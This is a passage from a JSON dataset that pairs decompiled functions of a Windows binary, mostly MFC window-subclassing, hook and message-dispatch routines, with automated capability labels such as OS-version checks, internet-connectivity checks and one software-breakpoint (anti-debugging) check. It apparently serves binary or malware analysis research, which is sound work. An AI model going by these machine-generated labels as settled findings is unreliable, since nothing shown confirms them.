        "decompiled_code": "\nint32_t * __cdecl fcn.0042d0ac(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    if (*(in_ECX + 8) != '\\0') {\n        var_4h = NULL;\n        iVar1 = (**(*in_ECX + 0xe4))(arg_8h, arg_ch, &var_4h);\n        if (-1 < iVar1) {\n            return var_4h;\n        }\n    }\n    piVar2 = fcn.0042ca5e();\n    return piVar2;\n}\n",
        "token_count": 165
    },
    "0042d20e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nuint fcn.0042d20e(void)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h_2;\n    uint var_14h;\n    uint var_18h;\n    uint var_10h;\n    uint var_40h;\n    uint var_24h;\n    uint var_14h_2;\n    uint var_ch_2;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = &stack0xffffffc0;\n    iVar1 = fcn.00438ea6(0x4371aa);\n    puVar4 = iVar1 + 0x58;\n    puVar5 = unaff_EBP + -0x40;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    iVar3 = *(unaff_EBP + 0x10);\n    arg_8h = *(unaff_EBP + 8);\n    *(iVar1 + 0x58) = *(unaff_EBP + 0xc);\n    *(iVar1 + 0x60) = *(unaff_EBP + 0x14);\n    *(iVar1 + 100) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x14) = iVar1;\n    *(iVar1 + 0x5c) = iVar3;\n    *(unaff_EBP + -4) = 0;\n    if ((iVar3 == 2) && (arg_8h[0x12] != 0)) {\n        (**(*arg_8h[0x12] + 0x60))(0);\n    }\n    *(unaff_EBP + 8) = 0;\n    if (iVar3 == 0x110) {\n        fcn.0042c069(arg_8h, unaff_EBP + -0x24, unaff_EBP + 8);\n    }\n    uVar2 = (**(*arg_8h + 0x108))(iVar3, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18));\n    *(unaff_EBP + 0x18) = uVar2;\n    if (iVar3 == 0x110) {\n        fcn.0042d195(arg_8h, unaff_EBP + -0x24);\n    }\n    uVar2 = *(unaff_EBP + 0x18);\n    puVar4 = unaff_EBP + -0x40;\n    puVar5 = iVar1 + 0x58;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 774
    },
    "0042d346": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042d346(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWnd.0;\n    *(unaff_EBP + -4) = 0;\n    if ((((extraout_ECX[7] != NULL) && (extraout_ECX != 0x450128)) && (extraout_ECX != 0x450178)) &&\n       ((extraout_ECX != 0x4501c8 && (extraout_ECX != 0x450218)))) {\n        fcn.0042cd57();\n    }\n    if (extraout_ECX[0x12] != NULL) {\n        (**(*extraout_ECX[0x12] + 4))(1);\n    }\n    pcVar1 = extraout_ECX[0x13];\n    if ((pcVar1 != NULL) && (*(pcVar1 + 0x24) == extraout_ECX)) {\n        *(pcVar1 + 0x24) = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042f31c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 351
    },
    "0042d4a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042d4a4(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    if ((param_1 != NULL) && (param_1[7] != 0)) {\n        iVar2 = (**(*param_1 + 0x120))();\n        piVar3 = param_1;\n        if (iVar2 == 0) {\n            param_1 = fcn.0042d465();\n            piVar3 = param_1;\n        }\n        while (piVar1 = piVar3,  piVar1 != NULL) {\n            piVar3 = fcn.0042d465();\n            param_1 = piVar1;\n        }\n        return param_1;\n    }\n    return NULL;\n}\n",
        "token_count": 188
    },
    "0042d4e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d4e5(uint arg_8h, uint Msg, uint wParam, uint lParam, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    for (arg_8h_00 = (*_sym.imp.USER32.dll_GetTopWindow)(arg_8h); arg_8h_00 != 0;\n        arg_8h_00 = (*_sym.imp.USER32.dll_GetWindow)(arg_8h_00, 2)) {\n        if (arg_1ch == 0) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h_00, Msg, wParam, lParam);\n        }\n        else {\n            iVar2 = fcn.0042cb28(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0042d20e(iVar2, *(iVar2 + 0x1c), Msg, wParam, lParam);\n            }\n        }\n        if (arg_18h != 0) {\n            iVar2 = (*pcVar1)(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0042d4e5(arg_8h_00, Msg, wParam, lParam, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 335
    },
    "0042d668": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042d668(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.0042cb42(param_2);\n    if (iVar1 != 0) {\n        (**(*param_1 + 0x50))();\n        piVar2 = (**(*param_1 + 0xf0))();\n        iVar1 = (*_sym.imp.USER32.dll_SetWindowLongA)(unaff_retaddr, 0xfffffffc, fcn.0042d2fb);\n        if (*piVar2 == 0) {\n            *piVar2 = iVar1;\n        }\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 179
    },
    "0042d6c6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d6c6(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*(param_1 + 0x1c));\n        uVar2 = fcn.0040f184(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(*(param_1 + 0x1c), uVar2);\n        fcn.0040f065(0xffffffff);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042d705. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x8c))();\n    return;\n}\n",
        "token_count": 206
    },
    "0042da52": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042da52(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.USER32.dll_SendDlgItemMessageA;\n    var_4h = 1;\n    if (arg_8h != NULL) {\n        do {\n            iVar1 = *arg_8h;\n            if (iVar1 == 0) break;\n            iVar3 = arg_8h[1];\n            var_8h = *(arg_8h + 2);\n            puVar5 = arg_8h + 4;\n            if (iVar3 == 0x1234) {\ncode_r0x0042dab9:\n                (**0x44c0d0)();\n                var_28h = 0xffffffff;\n                var_2ch = 1;\n                iVar3 = 0x401;\n                puVar6 = &var_2ch;\n                var_24h = puVar5;\ncode_r0x0042daf4:\n                iVar4 = (*pcVar2)(*(in_ECX + 0x1c), iVar1, iVar3, 0, puVar6);\n                if (iVar4 == -1) {\n                    var_4h = 0;\n                }\n            }\n            else {\n                puVar6 = puVar5;\n                if (iVar3 == 0x401) {\n                    iVar3 = 0x180;\n                    goto code_r0x0042daf4;\n                }\n                if (iVar3 == 0x403) {\n                    iVar3 = 0x143;\n                }\n                if (iVar3 == 0x401) goto code_r0x0042dab9;\n                if ((iVar3 == 0x180) || (iVar3 == 0x143)) goto code_r0x0042daf4;\n            }\n            arg_8h = puVar5 + var_8h;\n        } while (var_4h != 0);\n        if (var_4h == 0) {\n            return 0;\n        }\n    }\n    fcn.0042d4e5(*(in_ECX + 0x1c), 0x364, 0, 0, 0, 0);\n    return var_4h;\n}\n",
        "token_count": 578
    },
    "0042dd62": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dd62(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    code **ppcVar9;\n    code *pcVar10;\n    uint var_13ch;\n    uint var_10ch;\n    uchar var_dh;\n    uint32_t var_ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    iVar4 = fcn.00438ea6(0x4371aa);\n    if (arg_8h != 3) {\n        (*_sym.imp.USER32.dll_CallNextHookEx)(*(iVar4 + 0x28), arg_8h, arg_ch, arg_10h);\n        goto code_r0x0042df74;\n    }\n    piVar2 = *(iVar4 + 0x14);\n    iVar8 = *arg_10h;\n    iVar5 = fcn.00438818();\n    cVar1 = *(iVar5 + 0x14);\n    if ((piVar2 != NULL) || (((*(iVar8 + 0x23) & 0x40) == 0 && (cVar1 == '\\0')))) {\n        if (*0x4506fc == 0) {\ncode_r0x0042de25:\n            if (piVar2 == NULL) {\n                if (*0x450268 == 0) {\n                    fcn.004192e0(&var_13ch, 0, 0x30);\n                    var_13ch = 0x30;\n                    *0x450268 = (*_sym.imp.USER32.dll_GetClassInfoExA)(0, \"#32768\", &var_13ch);\n                    if (*0x450268 != 0) goto code_r0x0042deab;\n                    iVar8 = (*_sym.imp.USER32.dll_GetClassNameA)(arg_ch, &var_10ch, 0x100);\n                    if (iVar8 != 0) {\n                        var_dh = 0;\n                        iVar8 = fcn.0041869d(&var_10ch, \"#32768\");\n                        if (iVar8 == 0) goto code_r0x0042df4a;\n                    }\n                }\n                else {\ncode_r0x0042deab:\n                    iVar3 = (*_sym.imp.USER32.dll_GetClassLongA)(arg_ch, 0xffffffe0);\n                    if (iVar3 == *0x450268) goto code_r0x0042df4a;\n                }\n                var_ch = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_ch, 0xfffffffc);\n                pcVar10 = _sym.imp.USER32.dll_GetPropA;\n                if ((var_ch != 0) && (iVar8 = (*_sym.imp.USER32.dll_GetPropA)(arg_ch, \"AfxOldWndProc423\"),  iVar8 == 0))\n                {\n                    (*_sym.imp.USER32.dll_SetPropA)(arg_ch, \"AfxOldWndProc423\", var_ch);\n                    uVar6 = (*pcVar10)(arg_ch, \"AfxOldWndProc423\");\n                    if (uVar6 == var_ch) {\n                        (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(\"AfxOldWndProc423\");\n                        (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, 0x42dc0a);\n                    }\n                }\n            }\n            else {\n                fcn.0042cb42(arg_ch);\n                (**(*piVar2 + 0x50))();\n                ppcVar9 = (**(*piVar2 + 0xf0))();\n                pcVar10 = (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, fcn.0042d2fb);\n                if (pcVar10 != fcn.0042d2fb) {\n                    *ppcVar9 = pcVar10;\n                }\n                *(iVar4 + 0x14) = 0;\n            }\n        }\n        else {\n            uVar6 = (*_sym.imp.USER32.dll_GetClassLongA)(arg_ch, 0xffffffe6);\n            if ((uVar6 & 0x10000) == 0) {\n                puVar7 = *(iVar8 + 0x28);\n                if (puVar7 < 0x10000) {\n                    var_ch = var_ch & 0xffffff00;\n                    (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameA)(*(iVar8 + 0x28), &var_ch, 5);\n                    puVar7 = &var_ch;\n                }\n                iVar8 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(puVar7, 0x43f194);\n                if (iVar8 != 0) goto code_r0x0042de25;\n            }\n        }\n    }\ncode_r0x0042df4a:\n    (*_sym.imp.USER32.dll_CallNextHookEx)(*(iVar4 + 0x28), 3, arg_ch, arg_10h);\n    if (cVar1 != '\\0') {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar4 + 0x28));\n        *(iVar4 + 0x28) = 0;\n    }\ncode_r0x0042df74:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 1226
    },
    "0042df81": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042df81(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar1 = fcn.00438ea6(0x4371aa);\n    if (*(iVar1 + 0x14) != unaff_retaddr) {\n        if (*(iVar1 + 0x28) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, fcn.0042dd62, 0, uVar2);\n            *(iVar1 + 0x28) = iVar3;\n            if (iVar3 == 0) {\n                fcn.00429bb0();\n            }\n        }\n        *(iVar1 + 0x14) = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "0042e106": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_74h\n\nuint __cdecl fcn.0042e106(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t *arg_8h_00;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t unaff_EBP;\n    int16_t iVar11;\n    uint *in_FS_OFFSET;\n    int32_t *in_stack_ffffff70;\n    uint in_stack_ffffff84;\n    uint var_74h;\n    uint var_58h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = 0;\n    uVar7 = *(unaff_EBP + 8);\n    if (uVar7 == 0x111) {\n        iVar4 = (**(*arg_8h_00 + 0xe8))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n        if (iVar4 == 0) goto code_r0x0042e2f1;\ncode_r0x0042e5a1:\n        *(unaff_EBP + -0x10) = 1;\n        goto code_r0x0042e5f9;\n    }\n    if (uVar7 == 0x4e) {\n        if (**(unaff_EBP + 0x10) == 0) goto code_r0x0042e2f1;\n        iVar4 = (**(*arg_8h_00 + 0xec))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), unaff_EBP + -0x10);\ncode_r0x0042e5c5:\n        if (iVar4 == 0) goto code_r0x0042e2f1;\n        goto code_r0x0042e5f9;\n    }\n    puVar9 = *(unaff_EBP + 0x10);\n    if (uVar7 == 6) {\n        in_stack_ffffff84 = fcn.0042cb01(puVar9);\n        fcn.0042db33(arg_8h_00, *(unaff_EBP + 0xc), in_stack_ffffff84);\n    }\n    iVar11 = puVar9;\n    if ((uVar7 == 0x20) &&\n       (in_stack_ffffff70 = arg_8h_00,  iVar4 = fcn.0042db94(arg_8h_00, iVar11, puVar9 >> 0x10),  iVar4 != 0))\n    goto code_r0x0042e5a1;\n    if (((arg_8h_00[0x12] != 0) && (0 < *(arg_8h_00[0x12] + 0x70))) &&\n       ((((0x1ff < uVar7 && (uVar7 < 0x20a)) || ((0xff < uVar7 && (uVar7 < 0x110)))) ||\n        ((0x280 < uVar7 && (uVar7 < 0x292)))))) {\n        in_stack_ffffff70 = *(unaff_EBP + 0xc);\n        iVar4 = (**(*arg_8h_00[0x12] + 0x94))(uVar7, in_stack_ffffff70, puVar9, unaff_EBP + -0x10);\n        if (iVar4 == 0) goto code_r0x0042e1f8;\n        goto code_r0x0042e5f9;\n    }\ncode_r0x0042e1f8:\n    uVar5 = (**(*arg_8h_00 + 0x28))();\n    *(unaff_EBP + -0x14) = uVar5;\n    uVar7 = *(unaff_EBP + 8);\n    fcn.00439038(7);\n    iVar4 = ((uVar5 ^ uVar7) & 0x1ff) * 0xc;\n    iVar6 = *(unaff_EBP + -0x14);\n    if ((*(unaff_EBP + 8) != *(iVar4 + 0x44e8f8)) || (iVar6 != *(iVar4 + 0x44e900))) {\n        *(iVar4 + 0x44e8f8) = *(unaff_EBP + 8);\n        *(iVar4 + 0x44e900) = iVar6;\n        while (iVar6 != 0) {\n            if (*(unaff_EBP + 8) < 0xc000) {\n                iVar6 = fcn.0042b752(*(*(unaff_EBP + -0x14) + 4), *(unaff_EBP + 8), in_stack_ffffff70, 0);\n                *(unaff_EBP + 0x10) = iVar6;\n                if (iVar6 != 0) {\n                    *(iVar4 + 0x44e8fc) = iVar6;\n                    fcn.0043909b(7);\n                    goto code_r0x0042e289;\n                }\n            }\n            else {\n                iVar6 = *(*(unaff_EBP + -0x14) + 4);\n                while( true ) {\n                    iVar6 = fcn.0042b752(iVar6, 0xc000, 0, in_stack_ffffff84);\n                    *(unaff_EBP + 0x10) = iVar6;\n                    if (iVar6 == 0) break;\n                    if (**(*(unaff_EBP + 0x10) + 0x10) == *(unaff_EBP + 8)) {\n                        *(iVar4 + 0x44e8fc) = *(unaff_EBP + 0x10);\n                        fcn.0043909b(7);\n                        goto code_r0x0042e5e8;\n                    }\n                    iVar6 = *(unaff_EBP + 0x10) + 0x18;\n                }\n            }\n            iVar6 = **(unaff_EBP + -0x14);\n            *(unaff_EBP + -0x14) = iVar6;\n        }\n        *(iVar4 + 0x44e8fc) = 0;\n        fcn.0043909b(7);\ncode_r0x0042e2f1:\n        uVar8 = 0;\n        goto code_r0x0042e2f3;\n    }\n    iVar4 = *(iVar4 + 0x44e8fc);\n    *(unaff_EBP + 0x10) = iVar4;\n    fcn.0043909b(7);\n    if (iVar4 == 0) goto code_r0x0042e2f1;\n    if (0xbfff < *(unaff_EBP + 8)) {\ncode_r0x0042e5e8:\n        uVar8 = (**(*(unaff_EBP + 0x10) + 0x14))(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042e5f6;\n    }\ncode_r0x0042e289:\n    pcVar1 = *(*(unaff_EBP + 0x10) + 0x14);\n    iVar4 = *(*(unaff_EBP + 0x10) + 0x10);\n    iVar3 = puVar9 >> 0x10;\n    // switch table (65 cases) at 0x42e60d\n    switch(iVar4) {\n    case 1:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.00432562(puVar9);\n        goto code_r0x0042e412;\n    case 2:\n    case 3:\n    case 4:\n    case 0x18:\n    case 0x19:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x0042e412;\n    case 5:\n    case 0xc:\n        uVar5 = puVar9 >> 0x10;\n        puVar9 = puVar9 & 0xffff;\n        uVar7 = *(unaff_EBP + 0xc);\n        uVar5 = fcn.0042cb01(uVar7, puVar9, uVar5);\n        goto code_r0x0042e436;\n    case 6:\n        uVar7 = fcn.0042cb01(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042e54b;\n    case 7:\n    case 0xd:\ncode_r0x0042e412:\n        uVar8 = (*pcVar1)(puVar9);\n        goto code_r0x0042e5f6;\n    case 8:\n        fcn.00432160();\n        uVar8 = puVar9[1];\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x20) = uVar8;\n        fcn.0042c026();\n        uVar8 = *puVar9;\n        uVar2 = puVar9[2];\n        *(unaff_EBP + -4) = 1;\n        *(unaff_EBP + -0x58) = uVar8;\n        iVar4 = fcn.0042cb28(uVar8);\n        if (iVar4 == 0) {\n            if ((arg_8h_00[0x12] != 0) && (iVar4 = fcn.0042a68a(*(unaff_EBP + -0x58)),  iVar4 != 0)) {\n                *(unaff_EBP + -0x28) = iVar4;\n            }\n            iVar4 = unaff_EBP + -0x74;\n        }\n        uVar8 = (*pcVar1)(unaff_EBP + -0x24, iVar4, uVar2);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x58) = 0;\n        *(unaff_EBP + -0x10) = uVar8;\n        *(unaff_EBP + -4) = 0;\n        fcn.0042d346();\n        goto code_r0x0042e3e1;\n    case 9:\n        fcn.00432160();\n        uVar8 = puVar9[2];\n        *(unaff_EBP + -0x20) = puVar9[1];\n        *(unaff_EBP + -4) = 2;\n        uVar8 = (*pcVar1)(unaff_EBP + -0x24, uVar8);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x10) = uVar8;\ncode_r0x0042e3e1:\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.004325d8();\n        break;\n    case 10:\n        uVar7 = fcn.0042cb01(puVar9, *(unaff_EBP + 0xc) >> 0x10);\n        goto code_r0x0042e431;\n    case 0xb:\n        puVar9 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042e54b;\n    case 0xe:\n    case 0x2c:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042e54b;\n    case 0xf:\n        puVar9 = fcn.0043015e(puVar9);\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x0042e431:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x0042e436:\n        uVar8 = (*pcVar1)(uVar5, uVar7, puVar9);\n        goto code_r0x0042e5f6;\n    case 0x10:\n        (*pcVar1)();\n        break;\n    case 0x11:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x0042e56b;\n    case 0x12:\n    case 0x1b:\n    case 0x2a:\n    case 0x2f:\n        goto code_r0x0042e55e;\n    case 0x13:\n        puVar9 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042e561;\n    case 0x14:\n        puVar9 = iVar3;\n        uVar7 = iVar11;\n        goto code_r0x0042e561;\n    case 0x15:\n    case 0x16:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        goto code_r0x0042e58f;\n    case 0x17:\n        fcn.0042cb01(puVar9);\ncode_r0x0042e55e:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042e561;\n    case 0x1a:\n    case 0x25:\n    case 0x2e:\n        uVar8 = (*pcVar1)();\n        goto code_r0x0042e5f6;\n    case 0x1c:\n        puVar10 = *(unaff_EBP + 0xc);\n        uVar7 = fcn.0042cb01(puVar10);\n        fcn.0042cb01(puVar9, uVar7);\n        uVar5 = arg_8h_00[7] == puVar9;\n        goto code_r0x0042e593;\n    case 0x1d:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.00432562(puVar9);\n        goto code_r0x0042e56b;\n    case 0x1e:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.0043015e(puVar9);\n        goto code_r0x0042e56b;\n    case 0x1f:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        uVar5 = fcn.0043015e(*(unaff_EBP + 0xc), uVar7, puVar10);\n        goto code_r0x0042e593;\n    case 0x20:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x0042e4ce;\n    case 0x21:\ncode_r0x0042e4ce:\n        fcn.0042cb01(puVar9);\n        goto code_r0x0042e56b;\n    case 0x22:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        goto code_r0x0042e4ea;\n    case 0x23:\n        uVar7 = iVar11;\n        puVar10 = iVar3;\ncode_r0x0042e4ea:\n        uVar5 = fcn.0042cb01(*(unaff_EBP + 0xc), uVar7, puVar10);\n        goto code_r0x0042e593;\n    case 0x24:\n        uVar7 = fcn.0042cb01(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042e561;\n    case 0x26:\n        puVar10 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = fcn.0042cb01(puVar9, puVar10);\n        goto code_r0x0042e57b;\n    case 0x27:\n    case 0x28:\n        *(unaff_EBP + 8) = *(unaff_EBP + 0xc);\n        *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) >> 0x10;\n        if (iVar4 == 0x27) {\n            uVar7 = fcn.0042cb01(puVar9);\n            uVar5 = *(unaff_EBP + 0xc);\n            puVar10 = puVar9;\n            goto code_r0x0042e593;\n        }\n        puVar9 = *(unaff_EBP + 0xc);\n        uVar7 = *(unaff_EBP + 8);\ncode_r0x0042e561:\n        (*pcVar1)(uVar7, puVar9);\n        break;\n    case 0x29:\n    case 0x30:\ncode_r0x0042e56b:\n        (*pcVar1)(puVar9);\n        break;\n    case 0x2b:\n    case 0x33:\n        (*pcVar1)(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042e5a1;\n    case 0x2d:\n        uVar7 = iVar11;\n        puVar9 = iVar3;\ncode_r0x0042e54b:\n        uVar8 = (*pcVar1)(uVar7, puVar9);\ncode_r0x0042e5f6:\n        *(unaff_EBP + -0x10) = uVar8;\n        break;\n    case 0x31:\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\n        puVar10 = puVar9;\ncode_r0x0042e57b:\n        uVar5 = *(unaff_EBP + 0xc);\n        goto code_r0x0042e593;\n    case 0x32:\n        uVar7 = iVar11;\n        puVar10 = iVar3;\ncode_r0x0042e58f:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x0042e593:\n        (*pcVar1)(uVar5, uVar7, puVar10);\n        break;\n    case 0x34:\n        iVar4 = (*pcVar1)(*(unaff_EBP + 0xc), *(unaff_EBP + 0xc) >> 0x10, puVar9 & 0xffff, puVar9 >> 0x10);\n        *(unaff_EBP + -0x10) = iVar4;\n        goto code_r0x0042e5c5;\n    case 0x41:\n        iVar4 = (*pcVar1)();\n        *(unaff_EBP + -0x10) = iVar4;\n        if (iVar4 != 0) goto code_r0x0042e2f1;\n    }\ncode_r0x0042e5f9:\n    if (*(unaff_EBP + 0x14) != NULL) {\n        **(unaff_EBP + 0x14) = *(unaff_EBP + -0x10);\n    }\n    uVar8 = 1;\ncode_r0x0042e2f3:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar8;\n}\n",
        "token_count": 4433
    },
    "0042eb59": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
